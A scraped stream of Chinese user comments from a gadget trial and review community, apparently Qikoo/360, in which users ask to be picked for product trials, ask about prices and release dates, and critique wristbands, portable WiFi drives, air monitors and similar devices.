非常期待啊~~~功能很强大 外观霸气吊、、
期待好久了，希望试用一下新产品O(∩_∩)O~
超爱的    希望能参与这次的活动，让自己多了了解产品
支持奇酷，楼主加油哦
恩恩，谢谢夸奖，大家都会从中获得一些的，一起加油哒
嗯嗯，谢谢
大約什麼時候發售，是不是貨到付款
期待好久了，希望试用一下新产品
小巧多了。 
求抽中!!!!!!!!!!!!
蓝牙4.0，ble蓝牙低功耗
期待好久了，希望试用一下新产品O(∩_∩)O
期待好久了，希望试用一下新产品 一定要中.
期待期待试用效果。。。。
想要，有没机会抽中啊
期待花落我家啊
好东西，我喜欢。
也许下一个成功者就是我，上帝请给予我力量！阿门！
感觉自己需要一个这样的设备呀，期待使用中…
其实我觉得千万别加打电话功能，一没必要，二多傻啊，只能蓝牙外放，说啥都能听见。你就看三星的gear有人打电话么？好奇怪的行为啊。所以手环就是手环，满足运动需求就好了，千万别学gear，都开始5寸以上屏幕使用的年代了，忽然又跑回90年代小屏幕时代，好奇怪。 
这个贴有电池续航问题吗？
期待ing  想要ing
永远的歪粉！
期待好久了，希望试用一下新产品
简单的手环，不一样的感觉，让睡眠更理想，希望能在不知不觉中有不错的体验，希望能有一个尝试的机会。同时也希望在使用过程中，提供一些自己的体验感觉
http://wesmart.taobao.com 这有
应该做成金属外壳！加钥匙扣形状！加防水！金属散热好！钥匙扣携带方便！防水不说！形状应该小巧！象“忆捷（EAGET） U90-64G USB3.0极速防水防尘防静电全金属刀锋U盘 银色”这款外形差不多一样！
如果只是多了个随身WIFI，买那款简装版就好了！功能集一体的就不能那样臃肿！
我想问一下我买了之后我电脑没网我不能用丫
wifi出来就在京东买了2个 送朋友了个  U盘版是很期待啊  申请n次了 希望能试用成功，祝360U盘版wifi早点上市
毕竟系统急救安装软件也能支持！
哇哈哈哈。。好人还是有滴。。谢啦。。
我想知道我家里没有安网可以用吗?
我的家里没有安装宽带可用嘛?
哇，你都看了，你们都没有休息的吗，我还在有新发现就补充呢。
我只会用绘图涂，黑色笔涂得不好看，后来传的是用灰色笔涂得，好看些吧。。。。
我家里没有装宽带买来可以用吗]
申请时间已经过了么？本来想再买个360wifi的，结果看见这个产品了，想申请试试。
比第一代要好很多，360加油
当然不能了，这个就像路由器，要依赖宽带网络的。
这个产品好像过分夸大宣传了，每次试用也就100过一点，哪来的数万家长的使用反馈？？？360儿童卫士 2造型也比1难看多了 
快捷板太强大啦，但有的时候摁着不好使，或者会手机一直震动，需要重摁。红米。
已买别的牌子产品了~再见360~ 哥等不起你~http://item.taobao.com/item.htm?spm=a1z10.1.w7729142-7042955007.2.bp0LwH&amp;id=39397594111
还不知道会不会申请成功哪
小编会选我么
感觉一代二代都抽中了啊？什么情况这是？
好详细啊，很羡慕楼主抢到了
50位幸运者中,但愿我也是其中的一位...
手表真的很漂亮。
我已经提交申请，可能我的申请建议不是最好的，但是是最用心的！期待试用，为贵公司提供一份完美的试用报告！
玩家高度的东西肯定不错。
为什么蓝牙不能配对
密码是什么？ 
这个可以自己只能改善空气质量吗？比如加湿，净化空气
感觉这键盘 跟其他普通键盘没什么两样
我也觉得太不可思议了
J加油，加油，希望自己努力没有白费
哪里有卖的？我不要试用了，直接购买得了。
 申请试用，喜欢奇酷网
车型很好，但是实际它的速度怎么样？能上高速？我感觉嘛！概念车就是个坑
你买了？ .
我非常需要希望申请成功
感觉没什么实在意义 
多少钱，哪里能买到呢
加油！加油！这个产品对自己很实用，希望能够申请成功
k可以重装系统了
很期待，选我！
很好好强大  希望能选中我
值得拥有~~
快到20号吧...
一直都支持360，而且这个产品很实用，很喜欢，希望可以申请成功！
好啊好啊，能不能来个试用呢，
已经申请好多次了，希望这次选到我 
我要一个，行吗？
当年在川藏线上看到不少骑行的朋友对电量的需求直达马斯洛底层，现在搞个这神器带上就可以松口气了
http://www.pozible.com/project/182336
最低价格199限量预售 
到下列地址可以抢购，前51名199元，市场价599元 http://www.pozible.com/project/182336
我一定拥有
太贵。。。。。。。。。。。。奢侈。。。。。。。。。。。。。。。。
我一定能申请成功
申请，坚持中
支持安卓系统吗
滑板车出来啦，为什么不发售？
一直都在关注这一家，前几天下了一注，哈哈。宝贝到手了。正在试用中，感觉不错咯。改天晒晒宝贝扫地的图片。
我买什么都喜欢看中黑色的。卖家说这一款是UV烤漆的，对UV烤漆不太懂，卖家解释了很多，后来宝贝见到宝贝的庐山真面目，感觉真不错，周末收到的，研究了好久，看着它扫呀扫呀扫的，哈哈。还真有趣。特别是那个啥墙，虚拟墙，特有意思。它走到哪里，我就把这个墙放在它前面，它就不去了，走别的方向，哈哈。
买回来用了一下，声音很低，充一次用的时间也够长了。整体感觉不错。
这宝贝很实用，不想喜欢扫地的可建议买一台回家试试哦，扫的很干净的，什么碎纸机 烟头啊 头发 大小灰尘都清扫的干干净净的，以后可以省了扫地的时间的，
申请了好多次了就是一次都没中过...
是不是把手表功能设计上更实用了~~~
好像要！！！！
没钱QAQ
恩恩，我也是这么觉得，尤其是试用超级期待的产品！现在还很激动~~
没错没错。即使是蓝色的，我们女宝带也很漂亮，话说女宝宝带什么都很漂亮。。。。回头有时间拍下传个图。。。
恩。适合我这种懒人。
超喜欢，可以给我一次机会吗？
嗯，很酷，是我想要的
这也叫3D打印，，太幼稚的产品
确实有些失望！
很漂亮的外形，不想控制的时候，说话要屏蔽掉一些词语了，呵呵
觉得门铃功能还有点用处，其他……
看来你是中签了啊。赞一下。期待你的报告。
新的销售市场属于360，以前的种种是为了今天及日后的铺垫，真正的有舍便有得
在多一点颜色呗，这个颜色女孩子戴着不太好看
现在这类产品很火~希望体验一下，考虑购买~
吊炸天啊，
怎么每次公布时间都推迟，好期待啊！
以前用过WIFI2，效果非常好。希望这款带U盘的会更好！
网络点评的力量是很大的，这种产品试用宣传将来可以会成为主流。
吾正期待中
这个页面显示是3.6元，到天猫就变成9.9元了，这是神马原因？
普通人根本申请不上，用的都是托，奶奶的，又不是就你一个这样产品，换别的用不行啊
真心不错的东西
吸烟很大一部分是心理暗示作用，靠这个戒烟，悬了点，不过创意挺好！支持
这个产品如果能和净化器还有各种智能家居产品放到一起来做就精彩了。
看来是鱼缸上的空气质量最好
写的很有意思啊。。 看到有猫还以为会测空气中的毛发量
这专利 恐怕 360 引进要 花大价钱吧  ！！
送 妹纸  吗？ 
酷币兑换的儿童卫士什么时候能发货啊。暑期马上就到了，正好可以派上用场。
好期待这样的产品！
果然眼光独到~~~
恩，我也发现这个问题了，如果单纯只作为检测设备用，卖点会大大折扣。还有就是如果将PM2.5&amp;甲醛等数值不能细分陈列，还不能环境净化，这个不利于产品占有市场。。。
 好期待这样的产品！！！！
不知效果到底怎样
希望自己是最幸运的 
不知道充满电可以用多少天?
外形很漂亮，上次免费得了一串珠子和一张免费照片，这次有这运气吗？
感觉好像挺酷的，希望我能有机会吧。
看着还不错，蛮实用的，带一个
到底什么时候发售啊等这么长时间了
这我买过了！真心不错！！！
嗯，很不错，值得拥有，什么时候上市，非常期待！
样式简单，功能强大，小小的身体里蕴藏着不可思议的魅力，相信小伙伴们都会喜欢的
感觉很不错，不知道会不会试用成功呢？
第一次   中了 就有信心坚持下去了
呵呵，等吧，360，看看我有没有选进，没选进去买了，迫不及待 
这个收费？ 
这个拿来试用吗
如果1次中了，就有信心了！
第一次申请手表
第一次 中了 就有信心坚持下去了 
写的很详细啊
希望幸运轮到我
样式简约，功能强大，你值得拥有。
太鸡肋了 ，转化率不高 啊
以前用过WIFI2，效果非常好。希望这款带U盘的会更好！  
360一直都做得比小米好。支持
话不是这么说嘛，要看肾是卖给谁了，如果盖茨得了尿毒症找不到肾源，你的肾正好相配，那恭喜你，可以买很多Vertu了
加油 哈哈，小伙伴们快去申请吧
感觉比较鸡肋，所有功能都是已有的，就是简化了步骤。
都试用了好几批了，到底什么时候上市啊
我自己遇到这么长的评测也很难看完.就当写给需要的人看吧! 澄清一下,全是自己写的,就算是百度找的资料也是自己敲出来.图片引用了一些官方图. 事实上我们就是制造那些&quot;网上内容&quot;的人
之前的麦步计步器有一份我的评测.现在作为奇酷达人,会有更多评测机会.比如近期会放出SmartWallit pro的评测哦!
你当是iPhone那种廉价产品呢……Vertu可不是一个肾就打发了的……        呵呵
路过......
等不起，已买了其它的了
很漂亮   希望幸运轮到我
很给力，希望幸运。
很想看看效果，忠粉。
很给力，希望幸运来临。 
我觉得是一个非常amazing的项目，这个是很多人想过，但是还没有变成现实的一个产品，我并不是一个骑行的爱好者，但我相信这样的产品未来会有一大帮的客户群，因为你还没有拿到手就可以感觉他给你带来的便利。。期待这个项目的成功。。另外，这世界上从来不缺乏好的想法，缺少的是将好想法做成好产品的人。
支持360，做世界最好的产品。
哪个骑友没试过行在路上电子设备没电了，却依然要选择继续前行，哪怕什么都看不见，哪怕不知道终点在哪。如果真能有这样一部设备，相信谁都想要吧 
好想好想好喜欢哦
这个项目在朋友给的pozible链接上见过耶，酷毙了的感觉，我是个神经质的人，出门在外手机剩60%我都觉得很没有安全感，移动电源剩下两格电也没有安全感，现在可以把整个发电站都带出去啦哈哈哈，流浪都可以了。
确实等得有点久了，再不出估计我也会换其他产品了！！
iFind 最大的特点就是采用了电磁能量收集（Electro-magnetic Energy Harvesting）技术：“我们四周的空气中充满着无数的电磁波，比如手机信号、电视信号、广播信号等，以及防丢器与手机通讯时的蓝牙电磁波能量，这些都可以被收集起来作为驱动机器的电流。”创始人这样介绍 iFind 不用电池的技术。    简单的说就是用周围的信号给产品充电
一直在关注这种手环，可是一直没下手购买，觉得毕竟是新东西，耐久性好像也是个问题，看看这个怎么样吧！
主要还是便捷安装、安全防盗以及供电问题！
很好的产品，肯定市场需求爆棚，值得赞！
坐等销售…… 
这东西, 我不是有很大兴趣, 但可以, 去申请一下.
这是一个四人团队带来的精品哦，赞一个！期待试用~
我想买啊  速度出来
比较新鲜的产品，期待，能够体验一下。
不错，不错，过程很详细呢，加上神吐槽，哈哈
@奇酷官方还是很幽默的。哈哈......首先谢谢奇酷官方对我的评价。
其次我感觉像报告这种东西就要有创新，要有人看。我一直在想，什么样的报告才会有人看，之前产品的报告，我几乎都看过去了。感觉很千篇一律，无非就是一一上图一一讲解，然后再从网上找一些专业的资料，觉得这样的报告看多了，就像是几十个人的报告都差不多是一篇（原谅我这么直接的说你们，其实，我也是你们中的一员，因为这是最基本的报告。但是总感觉这样的程序哪里缺少了一部份）。
虽然说也有人在报告里面发表了些自己的见解，但毕竟是少数，大多数还是自己内心的一些旁白，比如说很激动自己中了，种种支持，然后种种得瑟。种种炫耀（这是对的，只有把产品炫耀成功了，那么这样的产品算是给推荐出去了）。好吧，我发现我现在越来越啰嗦了，不知不觉的差点又写上报告了，这是病，得改，请问奇酷官方，我还有救吗？有的话一定要救我......T-T
好运降临吧，阿门
我恨回复只能200字以内，把我原本好端端的一段话分成了三部份，这是额外我加的，以表我内心的无语。@奇酷官方#这回复的功能能改不，算是为我这种奇葩而改吧。毕竟像我这样的，地球已经不多了，且改且珍惜......T-T
科技的力量真是伟大啊
装系统的好东西来了，本人对360支持已有多年，安装360的机器无数每天最低3台以上，非常适用很体贴，不求试用，只求购买销售，为了自己也为了客户方便。继续期待新品发布。愿本品测试取得圆满成功。
为了孩子 好期待呀！
非常好的产品
何时发售啊，等的花儿都谢了N次了！
功能很好，希望幸运到来.
期待中，一直想要一个又有wifi，又能当U盘，出差、上班都能用
价格是关键，土豪还是少数
东西不错。但价格有点贵了
现在此相机已经在众筹网发起众筹，有意购买的朋友请移步http://www.zhongchou.cn/deal-show/id-9195?refl=qikoo
期待啊#☆.☆#
这个有市场
期待好的东西
谢谢，其实不算吐槽了，愿产品改良咯
记得前不久，我一个人骑着车只带了一个4000毫安时的移动电源，途中边看地图，边赶路，不知道是因为天气热的原因，没多久手机烫得要命，而且充上电也因为过热而导致充电速度慢。骑车的时候双腿摆动，因为手机和移动电源分别放在前后袋里，导致充电线接头损坏！！
恩  对的  对的
很专业的评测。
专业啊 很不错~~
评测写的很有娱乐性啊。哈哈
什么时候能发售，敢不敢来个准信。
这个有点意思哈。开车的人值得关注。
这个也有点太高科技了吧。高科技产品走进生活。
淘宝应该卖1880吧。
应该卖1880吧。
不错，好东东
值得期待的好产品。
多少银子啊?
PM2.5的指数、甲醛的指数要通过另外购买扩展插件然后再连接A1才能检测
嗯  你的点评也很专业
在21世纪最流行的除了吃喝玩乐莫过于娱乐了......哈哈哈哈......
 专业的点评
PM2.5的指数、甲醛的指数要通过另外购买扩展插件然后再连接A1才能检测 
希望能中奖啊，申请了这么多次一次也没有中过，希望这次有我哈
期待期待，
朋友推荐 已申请试用  望申请成功
喜欢才是硬道理~~加油~~希望好运气到来~~
请问你那安卓手机支持4G吗？
正好，既安全又方便，都不用记密码了~
耶稣，保佑我  如来，保佑我吧= =
期待结果哈~
不错 不错 但对于普通家庭来说还是贵了点 
大家看看，有什么疑问，请提一提，我好在使用的时候，注意一下.
高科技已经走进生活，只是海没有大众化而已，毕竟新的高科技产物非常昂贵不是一般人能承受的起的
360的东西确实挺不错的
肯定非常贵
非常好 多少钱
就你的建议也发挥下：话说多整几个外壳颜色加强美观，产品本身如果想要更美观也可以增加内置的彩色流线型光线，底座增加也可以。呼吸灯或是随着温度变化的散射。。如果能自定义就更好了。。毕竟家装的风格是变化万千的。这是硬件上面的美化。仅供参考！！
你说的很有道理，不知道这家公司对A1的定位是怎样的
很想要的一款东东
好期待这次中奖后的心情
好专业的评测，不愧是奇酷达人，你试用完了可否发我也用用←_←,等等...   怎么看着想熨斗！！！
还有一些测试还没做，关于传感器的灵敏度和精度。不过感觉温度这块似乎不是很准确。等两天测了再说吧
测试，是否有必要写成操作说明书，我理解应该是对各个功能的测试和想法
感觉不错····
不错！挺好用的！！！！
对啊。就是刚才说的传感器。第一次写，还有很多要学习的地方。后面还有会有补充的。谢谢提示
好啊@不知道能不能有防盗系统？？？？？？？？？
带个发电机出门😀
真的很喜欢
就喜欢360的产品
价格太高了
快点开奖吧，是我是我还是我，哈哈哈。。。。。。。。。。。。。。。。
正在申请中......不知道能不能显示时间
不知道是多少流明的？具体多大呢？
一次都没中过，这次让我中个
写了的啊115流明，安卓系统的配置还算中规中矩，光机太差了···
不错哈，朋友多多推荐
专业评测。非常简洁明了的介绍了空气检测仪。值得我们学习。
让我中一个吧   一期不落啊！！！
产品很不错，应该让我试用下！
非常期待这个，不中的话可能会考虑购买了。。。
我想知道光源是什么的？寿命如何光衰如何，图像尺寸每放大1英寸图像清晰度的变化如何？
睡眠一直不好，希望能试用！！！
大概什么时候能出，期待啊
下架了。。。。。。。。。。。。。。
官网说iPad 3/ iPad 4 / iPad mini可以使用~
连续几期产品试用都没申请成功，希望这次可以，最关键这个太实用了
达人我也申请了，求楼主帮忙啊，本人也很喜欢测评，且上班不忙，毕业3年来一直从事相关工作
如果宝宝在外面玩能叫他回家吗
哪家厂家有此款产品 麻烦与我联系   我需要一批  13575783166
求试用，对于近视的，要是能有夹片，这样更多的人都能收益！
我开车，没蓝牙，没中控视频导航，这个试用正好！
大哥，这不是360产的。。。。。。。。。。
写的很有艺术性呀
平时的短行用不着，长途的话，很容易暴晒，希望在设计时一定要考虑爆掉的风险。
希望能中奖啊，申请了这么多次一次也没有中过，希望这次有我哈 
去年就开始弄到现在还没上市啊
哎，试用就是个开箱照。。。没什么技术含量！
很酷的样子
连续几期产品试用都没申请成功，希望这次可以，
粉丝太多，数量略少，希望送出更多给粉丝
就怕这期又和我无缘~~~~
移动不是有出4G嘛又不要钱
非常期待能中，不中的话可能会购买了
多少钱?..
我喜欢bong！它带给我的说无比美丽到想象，超越了我的梦想，我喜欢！我想写一首诗送给bong：
难忘的bong 初夏，就在6月16日那一天 一只美丽的bong跃然出现我的眼帘 它带来了一片清凉 别致的感觉 将我引领进浩瀚的科技海洋  最初看到bong 是在奇酷的世界里 
来自心底的声音促使我打开了这个世界 一个个想法促使我要记载幅幅优美图片 感觉嫣然 咫尺距离里有了陪伴 无声时刻唯有来自心底的心弦 如馨如岚  美好时刻会带给我要珍惜bong美丽笑颜 整个季节的清风会在此刻为它吹送 真的想让指针停靠在这个波段不再移动 那是因为bong带给我了优美忆念 
bong羞涩了，  就在笑容与顽皮之间 美丽bong的容颜 是bong华丽展现 多彩而美丽的呈现离不开幕后的血汗 美丽了自己，快乐了心田 
依稀在腕 黑白相间的画面 一只璨璨闪亮的bong跃然眼前 雅致的颜色在我的臂腕 不忍移动传送目光的眼 整个色调显得更为清爽 我被bong的清爽所感染 感觉在bong的面前 好似接受使者的检验 不想离去的感觉让我再次将你的身影看见 bong，在这等待和期待的时刻呈现 
上帝重见 你我无意中走进了奇酷空间 那是一片蓝天 我们撒下了不同的心弦 为景陶醉 为bong绊牵 细致的心间 美妙的镜头成为纪念 目光定格在这个时间 只看着 期待bong释放的芳香气息一点点 就这样看着 窗外喧闹没有将心底撞翻、打乱 宁静的世界里忽然有了另一种流连 虽然目光在你的脸庞停留短暂 但在2014初夏的空气里面 有你做伴 
百看不厌  bong，脸红了 如同奇酷世界媚人的----颜。 
真好，我最愁记密码了。
希望我能申请成功，好期待，
希望中奖啊。。。。。。
把容量搞的大一点就好了，8GB有点小
bucuo  bucuo
每个车都有收音机，这个东东是多此一举。
逗你玩儿！
0.0009nm，那还能呼吸么
这个真心不错，刚看到虹膜的文章，完全可应用到现实当中
漂亮，不知道好用吗
什么时候出来啦？最好便宜点。。要是内存在大点就好了。！
好高级。。。
额。。。无语了 
快点开放购买吧，自己买的用的也舒心
支持奇酷↖(^ω^)↗ 申请过了，好期待。。。 嘛。。。不知道具体是什么样子的呢，比如怎么显示的
申请过了，好期待申请成功
赶紧发售啊，真心要等不起了。
期待，再也不怕忘密码。
求中！！！！！！！！！！！1
胖子必备么
希望能够早日梦想成真
期待 很期待  ....
申请了这么多次一次也没有中过，希望这次有我哈 
以后门锁全部可以替换了。支持
不能，手表不能对讲
希望我能申请成功
好想要好想要， 真的很想要哇。跪求一台哇。
偶的最爱，灰常灰常灰常想得到它
是的，贵了，非常想要。很有用
漂亮  好 
为什么都不给我申请通过一个呢，我都申请好多次了哇！！！！
苦苦等待中
期 待 中      
好期待，还有我的朋友们，向着体验冲啊，太棒的产品了
什么时候发售，越来越没有兴趣了，有点失望了  
中吧 南无药师琉璃光如来 保佑我
中吧 ***阿拉保佑我
中吧 上帝保佑我
哎 我这么诚心 中吧
期待能够有我的一台，我还要给上幼儿园的小朋友戴上一个！
会不会容易进水阿？感觉好像比较符合西方的烹饪方法，因为中国人的厨房不怎么会用到称，不过我喜欢，因为我喜欢做西点
又是装BI利器，好想戴它装一下
检测性能方面，下班回家测试了一下，各个项目的变化感知还是比较灵敏。但手上没有测量数值的工具，所以它的准确性还不清楚
有个问题，就是空气质量一直显示良，偶尔是优，它的判定标准是什么不知道。但这点很重要，因为要让人相信的话，最好就是拿标准和测量数据说话。这样，别人买你的产品才不会觉得被忽悠
明天上班再修改一下，手机上网，上不了图
金士顿（Kingston） DataTraveler SE9 32GB 金属U盘 银色
我只想说这次我会中奖吗？
期待中，赶紧量产吧
期待申请成功。。。
我是来拿大奖的
鸡冻中。。。。。
看着不错的样子！真的可以调节作息时间么？
谢谢评论......艺术什么的谈不上，只能算是个小小的吐槽报告吧。哈哈哈哈........
弱弱的说一句，为什么没有人点赞啊，难道我的浏览量不是因为我写的好，而是你们闲的蛋疼。好吧，求点赞，求评论，求超越，求人气（所谓的人气，就是看多了会不知不觉的感觉到气人），求......好吧，小学语文不是专业户，所以词量就这么多了，反正有求就是了......
能不能不要盖子啊，，，这样很容易丢盖子哎。。
第一次知道这网站，要好好评测
好想测试一下，中了么（0_0)
中国人烹饪都是粗放型的，比如放豆瓣、酱油、料酒、食盐等，都是凭经验下锅，哪怕就是新手上厨也从不会称量配菜。再说了，中国人做菜各种味道是特定佐料搭配出来的，使用代用品就不是那个本味了。如果回锅肉没有郫县豆瓣、红烧肉没有酱油，用酱油代替豆瓣、用豆瓣代替酱油，烧出来还叫回锅肉红烧肉吗？在中式烹饪中不适用。
这价格......唉！100美元折多少人民币哦，值吗？
填写完毕期待中...
第一次参加试用申请，期望不要向抢红米一样悲催
就中一枪吧！ 
买了wifi1购了土豪金2希望在中个U盘版的 
有意思，不知实际亮度如何？挺期待
预约没抢着,免费赠送个呗！
很心仪啊，求一台啊
很爱，适合我这类肥胖且需要减肥的人群，希望可以到我手中
更爱，比bong更进一步
很实用，对于我这种路痴更实用，有了这款不再担心出门迷路、道路不通畅了
给年老的外公带上一个，老年人经常活动打麻将，总是不注意作息时间，希望这个能帮他调整一下
好东西，碗已备好!
买了，挺好用的，还推荐了朋友购买，就是有一点不足之处，电脑关了就无法使用了 
已补充了测试情况
是不是先送个，我是你的潜在用户
老骗人，说好的18号呢
才50个，太难中了
你的报告在哪里？我去看看。
写的很不错哦。照片有点照的角度不对。好像都是躺着的图。
试试看，能中吗
阿弥陀佛，机会渺小希望我也能中签～～～～
好多概念手环啊。希望能有一个标杆式的产品出现。
和手机大小的白银差不多价格了吧？
我怎么一次都没有申请成功过？
神啊，幸运降临到我头上吧
shop for me
样式看起来很酷 
感觉还是bong更为出色
京东有，可惜没货
很想中哦，可以做WIFI，又可以做U盘；正好我家电脑总是中病毒，期待期待！！！！
期待期待~~希望好运~~
既然有安桌系统不知道，有没有接收无线网络的功能，还有亮度如何，是否有3D功能
这个好，家庭影院，期待
希望可以申请成功，一直都在申请，却一直没有中过
感觉比bong更好更帅气呢 有卖的？！
期待新产品。。。
ok，我没问题~
怎么还没有开卖。
嗯，说好是要今天18号的，今天可是我的生日哦。
试用了几天，报告也基本完善了。争取能再发现点秘密
主要看中运动那部分，睡觉也好赞。待机时间长很实用
哪有辐射。。。
快快快快快快快，FING FING开始吧,快点卖啊！
额，你异想天开了
实用，有了这款不再担心出门迷路
o.o木有机会了
为什么老是停留在设计研发中 
比三星的便宜多啦，期待中
牛逼啊！！！
很赞啊！！！
误报率高吗
赶在9月份开学前发售吧~~~~不然就只能买其他牌子了。
融入进手机才是未来的趋势
说错了，融入到手表
好东西，一定跟亲朋好友分享
不错，期待成品！
对呀为什么1代2代都有！360中国现在需要公平！！！请遵循公平！
我看了另一份报告也是1代2代都有你们可以公平吗？
我也发现这个问题估计内部人士分的吧！！360你可以公平吗？
非常喜欢，运动记录很有用！！！
很期待，希望能试用一下 
分析睡眠这个好 
最好还能检测心跳等数据
健康监控、运动记录都非常的实用。
希望可以申请成功
这次申请成功了，你们会看到非常精彩的测评
反正我不买~~~~
如果是叫醒功能的话，对家中有宝宝的我来说，比较不错
期待，希望能中
和米键比不管双击还是单击360按键灵敏度都比小米高了许多也更好控制，功能设置后也不会有应用延时而且还有很人性的防误按功能。但不足的地方也有，如闪拍的两次提示拍摄。如果单只拍照或许这个功能是很人性化的但如果用在闪拍上却显得很累赘。说闪拍当然是越快越好，如果等第二次震动提示再拍下照片那多数要抓的图像就动掉了，也就拍不出好的效果了。另外闪拍只支持后置镜头，没有镜头先择，如果想拍正面就不太方便了
很赞啊。减肥减得也有动力啊。
敢在具体点不，不过很早的时候我就知道有这个了，什么时候才能出啊
运动呐。减肥呐。
力挺360！！！
您值得拥有··呵呵··现在众筹还有优惠，可以加入会员优惠更多。众筹玩之后就会贵很多了··最重要的是会员不一定能加入得了啦··
是的··那是应该的··
内部人士分的吧！！360你可以公平吗？
您值得拥有··呵呵··现在众筹还有优惠，可以加入会员优惠更多。众筹玩之后就会贵很多了··最重要的是会员不一定能加入得了啦··
可以关注我们微信公众号：“亿航创世EHANG” ， 说不定哪天就可以抽奖免费获得Ghost呀！
哈哈，谢谢啦。
我是初三的学生希望可以来调节我的健康
外型I LIKE 期待成品
跪求一台啊。。。。。。。。。。
强大的科技 
一定得到，一定
一定要中啊。一定。。。
已经关注很久很久了,都到2了,咋还没见正式发售?!!!什么情况这是???逼着我们去买其他品牌?!!!!
夏季到了,是儿童放假\父母最担心的季节,是否该迅速推出产品?!!!!过了这个需求旺盛的季度,还有啥意义?!!!
谢谢分享，辛苦了！专业！
期待公开出售!!!!
期待期待~~希望好运~~                 
很想中哦，可以做WIFI，又可以做U盘,真心不错啊！可是我能不能用上呢？
0.3%的比例我能中吗？
真的可以有用吗？
有没有很NB的语音控制呢？这个很重要。
盗版的Oculus Rift么
Oculus3000多加上跑步机7000多，差不多一万了，还“合理”？
没有电池，需要接电源
怎么买。？ 
希望可以中吧
好多次都没中，希望这次可以 
怎么买。？ 
我是初二的学生，希望能中，对我的健康和学习有帮助 
电力足，防水，智能手表，运动手环，，，值得拥有
I like ,,,,,,,,,,,give me please!!!
很适合放在客厅有好看又可以听音乐
看起来很不错哦！！！好想要一个
希望中,中中中
求中签，可以否
.......
中吧.中吧
我推荐给你们为什么不给我加分？？？？？
作为提供给驾车一族的用户，语音控制也很重要。
用户体验性能稳定才是最重要的
作为手环，简单轻便，外观靓丽轻巧，功能使用方便，性能稳定。期待
这个产品不错啊，省的到处找电源。
要是换成USB3.0的就好了
就是太贵，
求中，求……。我乃初一学生一枚，希望它可以改善我的健康及学习。
什么时候发布IOS版 
好想试试啊 
一直在试用，一直在申请，就是不见东西。
功能更加强大，期待
外形酷，功能不错，有车一族的不错选择
哇，这个真心超级赞，坐等、、、、、
哪里可以买呢，可以和电脑连接么，和电脑连接的话，要接连接线吗？
几率这么小的事情能轮到我们身上？
我好想好想有一个送个我喜欢听黄力宏的老婆啊
 现在就想试试这个小东西！！！  希望我能中啊
现在对360印象越来越好了
容量大些更好
要是能申请试用一个就好了
真好 不知道能不能申请成功
好像试试看
真是天才的发明
期待试用中奖
快快快试试用
可以做WIFI，又可以做U盘；还可以做启动盘啊
可以做WIFI，又可以做U盘；还可以做启动盘啊
可以做WIFI，又可以做U盘；还可以做启动盘啊
说近期要上市,到底是多少期,还是遥遥无期,真想超了！
中个毛,都120苦逼了,想想也该轮到咱了吧!可就是让人家一个劲的中,也没咱的份,日逼的苦逼到酷币.
再不上市你罪可就大了
给我弄一个
你是来搞笑的吗
很想中哦，可以做WIFI，又可以做U盘,真心不错啊！可是我能不能用上呢？
中的概率太小了，还是先买一个360随身wifi 2代先用着吧
这个是每个人需要的健康助手。强烈支持！！！
只要数据不会错，就百分之百买。因为买车载导航不好用、地图更新很难！
哇哦  神器啊
还在创意中啊，我以为已经上市了呢
关键是数据的准确性
我能中吗？
市面已经有微型投影仪了，不知道奇酷的这款有什么特色吗？
哈哈   可惜国内的网络哇。太差
支持！！！
应该是3%
支持！！！！
这个对做美食太有帮助了！支持一下！
支持！！！！
哇哦 现在年轻人对这些新潮产品真的很有关注度~~
可惜不支持我的手机，等以后买了新手机再来！不过很喜欢，先收藏支持一下！
我看了，我顶了。希望你能回看，回顶。请记住我的昵称
现在可以在“点名时间”预约，直接说话就行，不需要和电脑连接，也不需要和手机连接。
会有机会的。
如果有自身防盗功能就好了，安装希望能够简单一些！
现在可以在“点名时间”预约，可以第一时间得到产品。
感谢支持噢
希望这个产品能让我在娱乐中就可以减肥成功！
貌似插SIM卡的 
支持！！！！
是啊，不知道有没有防盗系统呢？现在偷车的太猖狂了，这样拉风的车骑出去就怕被偷呢！
喜欢，太有用了。
看起来不错的样子。
功能强大值得期待 
太牛了！！！！ 
期望能中吧，又能当u盘，又能当随身wifi，真心不用担心办公室的信号问题了
好吧，对于礼尚往来。本人还是果断赞的......
不错的东东！
我来了，别谢我。请叫我雷锋......
看现在浏览量最多的那个就是我的，哈哈......我只不过是略屌。
中啊中啊好嘛
什么时候有
光圈太小了，最大才8啊 内置广角不错，就是不知道范围是多少。 样子很复古的说，赞一个！
希望能够选中把
这种插口不符合国家安全标准啊，早几年就淘汰了，怎么还在用？！
看你的评价这产品是没法卖了
雷锋，你好！
用纸电池你不考虑价格吗。。。
这测评太对付事
360官方发布360儿童卫士起价80美元,由于价太底,一直上市不了的原因!
暑假即将到来，发售的时机到了，再不发售，黄花菜都凉了。
还有一天了，期待哈，希望能中啊，保佑，
好歹中一次啊，一次也没有中过，55555555555555555
购买的智键到了，非常开心，希望这个也能到。支持360的产品
牛，这个太酷毙了
赞，期待亲民价格哦
高科技，那还需要一个IPA的才行啊
我也兑换到智键，看看明天还这么幸运吗！
这个价格应该不便宜吧
感谢支持！现在已经介绍预约了，上小智官网 http://www.smallzhi.com
比较酷，期待 
你这也叫试用报告，有用的基本什么也没写，浪费资源，强烈鄙视！！！！
离实用还很远
多么期待能收到这个产品呢
我一定中的
现在年轻人对这些新潮产品真的很有关注度~~ 希望能够选中把
不错不错值得推荐
什么时候发行求试用
高端啊好东西求试用
海尔有这实力
商务不错的选择求试用
好不赖.......... 
酷啥时上市求求
是不是抄作业抄习惯了，好像是抄的别的评测者的文字。。。
我很忠诚的
360得产品顶呱呱
3万多人100个  3%？？？？你怎么算的？
夜猫子专用设备
别人评论。。。。是你的报告它爸爸的评论么
已赞，别问我是谁，我是隔壁邻居家远房亲戚的三叔家的二姨太的表哥的同学的三大爷的邻居。leifeng
0.3%     没错吧？
我不知道价格...我只知道是可以外接的又轻又薄，想要可以单买就好了，现在就是，没有意外就是好事，一旦有意外，1天半真的有些少，再加上要不停定位和录音。我也只是提个意见，或者其他方法增加续航时间，比如太阳能、动能就更好了。
如果我能中，我一定会给大家一个真实而完整的评测的。大家支持下我吧！谢谢
你数学是语文老师教的？
雷锋同志，你好！ 
跟踪的很好，今天跟姥姥去菜市场，被上班的我发现了。哈哈，姥姥也觉得很赞~
谢谢，应该的
太贵了 真心喜欢 真心买不起
又发现小A发热还是比较多，更新了下
感觉产品还是非常不错的。
报告中的文字涉嫌抄袭，请赶快修改。不然永久列入黑名单
好贵啊！！！
我已经在卖了哟  哈哈
399  要买找我
每次都很积极的申请，可一次都没中，哎.....
同求啊同求。改了好几遍了。
支持不多说，传递正能量！！
直接封号啊 还给这种垃圾机会？
